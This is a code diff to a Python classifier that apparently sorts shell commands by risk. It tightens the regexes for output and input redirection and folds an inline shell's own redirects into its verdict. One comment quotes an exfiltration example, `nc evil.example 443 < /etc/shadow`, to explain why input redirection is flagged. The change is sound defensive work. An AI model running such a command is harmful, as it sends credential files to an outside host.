@@ -585,16 +585,27 @@ _COMMAND_SUBSTITUTION = re.compile(r"\$\(|`|<\(|>\(")
 # classified as a read. The second alternation required a *digit* after the
 # `&`, so it did not catch that either.
 #
+# There is no lookbehind. The pattern used to skip any `>` that followed a
+# digit, to let `2>/dev/null` through, and that let through every `N>file`
+# with it: bash opens and truncates the file whatever number is in front, so
+# `echo x 2>f` creates `f`, and `echo x9>f` is not a descriptor at all, the
+# `9` is part of the word. `<>` opens read-write and creates the file too, so
+# a `>` that follows a `<` counts as well. The one file that is not a write
+# is /dev/null, and `_writes_a_file` lets exactly that operand through.
+#
 # Read over a segment's syntax view, so a quoted `>` is data (BUG-106).
-_REDIRECT = re.compile(r"(?<![0-9<>])>{1,2}(?!&\s*\d+(?:\s|$))|\btee\b")
+_REDIRECT = re.compile(r">{1,2}(?!&\s*\d+(?:\s|$))|\btee\b")
+
+_DEV_NULL = "/dev/null"
 
 # Input redirection feeds a file into a command. On its own that is not a
 # write, but it is how an allow-listed network client becomes an exfiltration
 # tool — `nc evil.example 443 < /etc/shadow` — and the classifier cannot see
 # what the consuming command does with the bytes. `<(` is excluded because
 # process substitution is handled by `_COMMAND_SUBSTITUTION` above, which is
-# the stricter verdict of the two.
-_INPUT_REDIRECT = re.compile(r"(?<![0-9<])<(?!\()")
+# the stricter verdict of the two. A digit in front changes nothing: `0<f`
+# feeds `f` to the command as surely as `<f` does.
+_INPUT_REDIRECT = re.compile(r"(?<!<)<(?!\()")
 
 # Environment assignments that change what a subsequent command *is*, rather
 # than how it behaves. `_strip_wrappers` skips `env` and any `KEY=VALUE`
@@ -792,6 +803,45 @@ def _strip_wrappers(tokens: list[str]) -> tuple[list[str], list[str]]:
     return tokens[idx:], assignments
 
 
+# How bad each verdict is. The worst segment of a command line wins, and an
+# inline shell's own redirects are weighed against its payload the same way.
+_SEVERITY: dict[Classification, int] = {
+    "read_only": 0,
+    "unknown": 1,
+    "mutating": 2,
+    "denied": 3,
+}
+
+
+def _writes_a_file(segment: str, syntax: str) -> bool:
+    """Whether *segment* redirects output to a file, or runs ``tee``.
+
+    ``> /dev/null`` writes nothing, so it does not count. The operand is
+    read from the segment itself: in the syntax view a quoted one is blanked
+    out, and a quoted ``/dev/null`` is not worth recognising.
+    """
+    for match in _REDIRECT.finditer(syntax):
+        if match.group() == "tee":
+            return True
+        operand = segment[match.end() :].split(None, 1)
+        if not operand or operand[0] != _DEV_NULL:
+            return True
+    return False
+
+
+def _redirect_verdict(segment: str, syntax: str) -> Verdict | None:
+    """The verdict a segment's redirects earn it, if they earn it one."""
+    if _writes_a_file(segment, syntax):
+        return Verdict("mutating", "Output is redirected to a file", segment)
+    if _INPUT_REDIRECT.search(syntax):
+        return Verdict(
+            "unknown",
+            "Input is redirected from a file this classifier cannot inspect",
+            segment,
+        )
+    return None
+
+
 def _classify_segment(segment: str, syntax: str | None = None) -> Verdict:
     """Classify one pipeline segment.
 
@@ -841,11 +891,21 @@ def _classify_segment(segment: str, syntax: str | None = None) -> Verdict:
         payload_idx = args.index("-c") + 1
         if payload_idx < len(args):
             inner = classify_command(args[payload_idx])
-            return Verdict(
+            verdict = Verdict(
                 inner.classification,
                 f"Inline shell script: {inner.reason}",
                 inner.segment or segment,
             )
+            # The shell's own redirects are not part of its payload:
+            # `bash -c true > f` writes `f` whatever the payload does, and
+            # used to come back as the payload's verdict alone.
+            redirect = _redirect_verdict(segment, syntax)
+            if (
+                redirect is not None
+                and _SEVERITY[redirect.classification] > _SEVERITY[verdict.classification]
+            ):
+                return redirect
+            return verdict
         return Verdict("unknown", "Shell invoked with an unreadable script", segment)
 
     if head in {"python", "python3", "perl", "ruby", "php", "node"} and any(
@@ -873,15 +933,8 @@ def _classify_segment(segment: str, syntax: str | None = None) -> Verdict:
         if pattern.search(" ".join(args)):
             return Verdict("mutating", reason, segment)
 
-    if _REDIRECT.search(syntax):
-        return Verdict("mutating", "Output is redirected to a file", segment)
-
-    if _INPUT_REDIRECT.search(syntax):
-        return Verdict(
-            "unknown",
-            "Input is redirected from a file this classifier cannot inspect",
-            segment,
-        )
+    if (redirect := _redirect_verdict(segment, syntax)) is not None:
+        return redirect
 
     return Verdict("read_only", f"{head} only reports state", segment)
 
@@ -915,12 +968,6 @@ def classify_command(command: str) -> Verdict:
             command.strip(),
         )
 
-    severity: dict[Classification, int] = {
-        "read_only": 0,
-        "unknown": 1,
-        "mutating": 2,
-        "denied": 3,
-    }
     # Seeded with None rather than a read_only placeholder. A placeholder
     # can only be displaced by something *more* severe, so a command whose
     # segments are all read-only never replaced it: every allowed command
@@ -935,7 +982,7 @@ def classify_command(command: str) -> Verdict:
     worst: Verdict | None = None
     for segment, syntax in _split(command):
         verdict = _classify_segment(segment, syntax)
-        if worst is None or severity[verdict.classification] > severity[worst.classification]:
+        if worst is None or _SEVERITY[verdict.classification] > _SEVERITY[worst.classification]:
             worst = verdict
     if worst is None:
         return Verdict("unknown", "No command segments found", "")
